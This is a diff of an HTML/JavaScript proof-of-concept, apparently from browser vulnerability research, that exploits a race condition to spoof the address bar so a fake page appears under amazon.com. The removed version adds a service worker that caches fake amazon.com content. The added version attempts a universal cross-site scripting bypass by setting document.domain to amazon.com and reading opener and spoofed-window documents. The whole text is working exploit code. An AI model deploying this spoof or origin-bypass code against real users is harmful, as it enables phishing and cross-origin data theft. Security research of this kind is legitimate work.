@@ -1,173 +1,88 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Further Enhanced Spoof PoC</title>
-  </head>
-  <body>
-    <a id="test" href="https://www.amazon.com/" onclick="foo()"
-      >https://www.amazon.com/</a
-    >
-  </body>
-  <script>
-    var w;
-    var animationFrameId;
-
-    if (location.href.indexOf("fake") !== -1) {
-      // Enhanced fake page with nested iframes to complicate eviction
-      document.body.innerHTML =
-        "<h1>This website has moved to http://fake.com</h1><div id='nested'></div>";
-      // Add nested iframes for deeper rendering complexity
-      const nestedDiv = document.getElementById("nested");
-      for (let i = 0; i < 3; i++) {
-        // 3-level nesting
-        let iframe = document.createElement("iframe");
-        iframe.srcdoc = `<h1>Nested Fake Level ${
-          i + 1
-        }</h1><iframe srcdoc="<h1>Deeper Fake</h1>"></iframe>`;
-        iframe.style = "display:none";
-        nestedDiv.appendChild(iframe);
-      }
-      // Add event listener to re-inject if content cleared
-      window.addEventListener("load", () => {
-        if (!document.body.innerHTML.includes("fake.com")) {
-          document.body.innerHTML =
-            "<h1>This website has moved to http://fake.com</h1>";
+<head>
+    <title>Tweaked Spoof PoC with UXSS Test</title>
+</head>
+<body>
+    <a id="test" href="https://www.amazon.com/" onclick="foo()">https://www.amazon.com/</a>
+</body>
+<script>
+var w;
+var t;
+var z;
+if (location.href.indexOf("fake") !== -1) {
+    document.body.innerHTML = "<h1>This website has moved to http://fake.com</h1>";
+    
+    // Pengujian impact UXSS via document.domain
+    // Attempt to relax document.domain to a superdomain (e.g., for subdomain scenarios)
+    // In real deployment, assume hosted on a subdomain of the victim (e.g., attacker.amazon.com)
+    // This tests if document.domain can be set, potentially allowing SOP bypass in stale content during spoof
+    // If successful in legacy browsers/WebViews, could lead to UXSS by relaxing origin for cross-subdomain access
+    try {
+        // For testing, set to a potential superdomain; adjust based on host
+        // In local, may fail due to invalid domain; in production, use victim suffix
+        document.domain = 'amazon.com'; // Attempt to set to victim domain for UXSS test (will fail if not suffix)
+        alert("document.domain successfully relaxed to 'amazon.com' - Potential UXSS impact: Check if allows cross-origin access in spoofed context");
+        console.log("Effective domain after set: " + document.domain);
+        
+        // Additional UXSS test: If there's a parent or opener, try access (simulate cross-subdomain)
+        if (window.opener) {
+            try {
+                var openerBody = window.opener.document.body.innerHTML;
+                alert("UXSS Success: Accessed opener document - " + openerBody.substring(0, 50));
+            } catch (accessError) {
+                alert("UXSS Access Failed: " + accessError.message);
+            }
         }
-      });
+    } catch (e) {
+        alert("Failed to set document.domain: " + e.message + " - No UXSS impact via this method in this browser");
+        console.log("document.domain set error: " + e);
     }
-
-    function foo() {
-      document.getElementById("test").href = "#";
-      w = window.open("?fake");
-      animationFrameId = requestAnimationFrame(bar);
-    }
-
-    function bar() {
-      if (w.location.href !== "about:blank") {
-        alert("Redirecting"); // Existing alert for interaction
-        // Add prompt for user interaction delay to widen race (bypass paint timers)
-        prompt("Confirm redirection? (This delays paint for race condition)");
+}
+function foo() {
+    document.getElementById("test").href = "#";
+    w = window.open("?fake");
+    t = setInterval(bar, 5); // Adjusted interval for better timing sync
+}
+function bar() {
+    if (w.location.href !== 'about:blank') {
+        alert("Redirecting");
         document.body.innerHTML = "<h1>Redirecting</h1>";
         slow();
-        w.location.href = "https://www.amazon.com/";
-        animationFrameId = requestAnimationFrame(baz);
-      } else {
-        animationFrameId = requestAnimationFrame(bar);
-      }
+        w.location.href = 'https://www.amazon.com/';
+        clearInterval(t);
+        z = setInterval(baz, 5);
     }
-
-    function baz() {
-      try {
-        w.location.href !== "about:blank";
-        animationFrameId = requestAnimationFrame(baz);
-      } catch (e) {
-        // Simulate tab switch
-        w.blur();
-        setTimeout(() => w.focus(), 50);
-
-        // Slower 204 endpoint
-        w.location.href = "https://httpstat.us/204?sleep=200";
-
-        // Modified chain: Use a non-blank data URI with minimal content to avoid full clear
-        setTimeout(() => {
-          w.location.href = "data:text/html,<span></span>"; // Empty span to prevent blank page
-        }, 100);
-
-        // Continuous URL update to mimic new issue (continuous spoofing)
-        let updateCount = 0;
-        const updateInterval = setInterval(() => {
-          if (updateCount < 5) {
-            // Limit to avoid infinite loop
-            w.location.href = `https://www.amazon.com/?spoof=${updateCount}`; // Variant URL to confuse bar update
-            updateCount++;
-          } else {
-            clearInterval(updateInterval);
-          }
-        }, 50);
-
-        // PostMessage for cross-window injection post-redirect
-        setTimeout(() => {
-          w.postMessage(
-            { action: "inject", html: "<h1>Re-injected Fake Content</h1>" },
-            "*"
-          );
-        }, 150);
-
-        cancelAnimationFrame(animationFrameId);
-      }
+}
+function baz() {
+    try {
+        w.location.href !== 'about:blank';
+    } catch (e) {
+        // Stop page loading with alternative slow 204-like endpoint
+        w.location.href = 'https://www.google.com/csi';
+        clearInterval(z);
+        
+        // Post-interruption UXSS test in opener context
+        // Test if we can access the opened window's document after spoof (should fail due to cross-origin after redirect)
+        try {
+            var spoofedBody = w.document.body.innerHTML;
+            alert("Post-spoof UXSS Success: Accessed spoofed window document - " + spoofedBody.substring(0, 50));
+        } catch (accessError) {
+            alert("Post-spoof UXSS Access Failed: " + accessError.message + " - SOP enforced");
+        }
     }
-
-    // Add listener for postMessage in main script (for fake window to receive)
-    window.addEventListener("message", (event) => {
-      if (event.data.action === "inject") {
-        document.body.innerHTML = event.data.html;
-      }
-    });
-
-    function slow() {
-      for (let i = 0; i < 100; i++) {
+}
+// Enhanced slowdown: More iframes + CPU-intensive loop
+function slow() {
+    for (let i = 0; i < 50; i++) { // Increased iframes
         let iframe = document.createElement("iframe");
-        iframe.src = "https://www.amazon.com/";
-        iframe.style = "display:none";
+        iframe.src = 'https://www.amazon.com/';
+        iframe.style = 'display:none';
         document.body.appendChild(iframe);
-      }
-
-      const workerCode = `
-        onmessage = () => {
-            let a = 0, b = 1;
-            const start = performance.now();
-            while (performance.now() - start < 200) {
-                let c = a + b;
-                a = b;
-                b = c;
-            }
-            postMessage('done');
-        };
-    `;
-      const blob = new Blob([workerCode], { type: "application/javascript" });
-      const worker = new Worker(URL.createObjectURL(blob));
-      worker.postMessage("start");
-      worker.onmessage = () => worker.terminate();
-
-      let start = performance.now();
-      while (performance.now() - start < 100) {}
     }
-
-    // Enhanced Service Worker: Cache fake content more robustly
-    if ("serviceWorker" in navigator && location.href.indexOf("fake") === -1) {
-      const swCode = `
-        self.addEventListener('install', event => {
-            event.waitUntil(
-                caches.open('spoof-cache').then(cache => {
-                    return cache.addAll([
-                        new Request('https://www.amazon.com/', {
-                            method: 'GET',
-                            headers: {'Content-Type': 'text/html'},
-                            body: '<h1>Cached Fake Content from SW</h1>'
-                        })
-                    ]);
-                })
-            );
-        });
-
-        self.addEventListener('fetch', event => {
-            if (event.request.url.includes('amazon.com')) {
-                event.respondWith(
-                    caches.match('https://www.amazon.com/').then(response => {
-                        return response || fetch(event.request);
-                    })
-                );
-            }
-        });
-    `;
-      navigator.serviceWorker
-        .register(
-          URL.createObjectURL(
-            new Blob([swCode], { type: "application/javascript" })
-          )
-        )
-        .then((reg) => console.log("SW registered"))
-        .catch((err) => console.error("SW error", err));
-    }
-  </script>
+    // Add CPU loop to widen race window
+    let start = performance.now();
+    while (performance.now() - start < 100) {} // ~100ms busy-wait
+}
+</script>
 </html>
